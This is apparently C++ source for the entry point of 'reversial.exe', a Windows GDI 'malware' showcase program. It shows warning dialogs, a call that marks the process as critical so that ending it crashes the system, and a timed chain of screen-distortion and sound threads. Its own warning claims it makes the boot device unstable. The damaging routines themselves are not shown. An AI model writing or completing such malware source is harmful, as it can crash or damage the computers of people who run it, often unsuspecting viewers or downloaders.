// reversial.cpp : Defines the entry point for the application.
//
...
int WINAPI WinMain(HINSTANCE hia,
	...
	if (MessageBoxW(NULL, L"Fair Warning!, Run A Malware For Sure?, \nAre you sure to run dangerous malware, you will unstable boot device,\n do you run during a malware, for an test malware? \n Are You Sure? \n links: \nhttp://www.youtube.com/@Hugopakowashacked / http://www.youtube.com/@hugopakoarchive \nhttp://www.youtube.com/@expertworks4417", L"reversial.exe (Made By P. ĐĂNG & ExpertWorks)", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
		ExitProcess(0);
	}
	else {
		if (MessageBoxW(NULL, L"This Is The Last Warning!, Are You Sure? \nthe creator will not be responsible for any of the damage caused!", L"reversial.exe (Made By P. ĐĂNG & ExpertWorks)", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
			ExitProcess(0);
		}
		else {
			ProcessIsCritical();
			...
			sfx1();
			Sleep(10000);
			HANDLE gdi1dot1 = CreateThread(0, 0, p1::GDI2, 0, 0, 0);
			Sleep(30000);
			TerminateThread(gdi1, 0);
			CloseHandle(gdi1);
			TerminateThread(gdi1dot1, 0);
			CloseHandle(gdi1dot1);
			InvalidateRect(0, 0, 0);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE gdi2 = CreateThread(0, 0, p2::GDI, 0, 0, 0);
			HANDLE gdiball = CreateThread(0, 0, iamohioball, 0, 0, 0);
			sfx2();
			Sleep(25000);
			...
			sfx3();
			Sleep(15000);
			HANDLE gdi3dot1 = CreateThread(0, 0, p3::GDI2, 0, 0, 0);
			Sleep(30000);
			TerminateThread(gdi3, 0);
			CloseHandle(gdi3);
			TerminateThread(gdi3dot1, 0);
			CloseHandle(gdi3dot1);
			InvalidateRect(0, 0, 0);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			...
			sfx7();
			Sleep(15000);
			HANDLE gdi7dot1 = CreateThread(0, 0, p7::GDI2, 0, 0, 0);
			Sleep(30000);
			TerminateThread(gdi7, 0);
			CloseHandle(gdi7);
			TerminateThread(gdi7dot1, 0);
			CloseHandle(gdi7dot1);
			InvalidateRect(0, 0, 0);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			...
			sfx9();
			Sleep(5000);
			HANDLE gdi9dot1 = CreateThread(0, 0, p9::GDI2, 0, 0, 0);
			Sleep(30000);
			TerminateThread(gdi9, 0);
			CloseHandle(gdi9);
			TerminateThread(gdi9dot1, 0);
			CloseHandle(gdi9dot1);
			InvalidateRect(0, 0, 0);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE gdi10 = CreateThread(0, 0, p10::GDI, 0, 0, 0);
			sfx10();
			Sleep(5000);
			TerminateThread(gdi10, 0);
			CloseHandle(gdi10);
			InvalidateRect(0, 0, 0);
			HANDLE gdi10dot1 = CreateThread(0, 0, p10::theend, 0, 0, 0);
			Sleep(15000);
			HANDLE gdi10dot2 = CreateThread(0, 0, p10::theend2, 0, 0, 0);
			Sleep(30000);
			TerminateThread(gdi10dot1, 0);
			CloseHandle(gdi10dot1);
			TerminateThread(gdi10dot2, 0);
			CloseHandle(gdi10dot2);
			TerminateThread(gdiball, 0);
			CloseHandle(gdiball);
			InvalidateRect(0, 0, 0);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
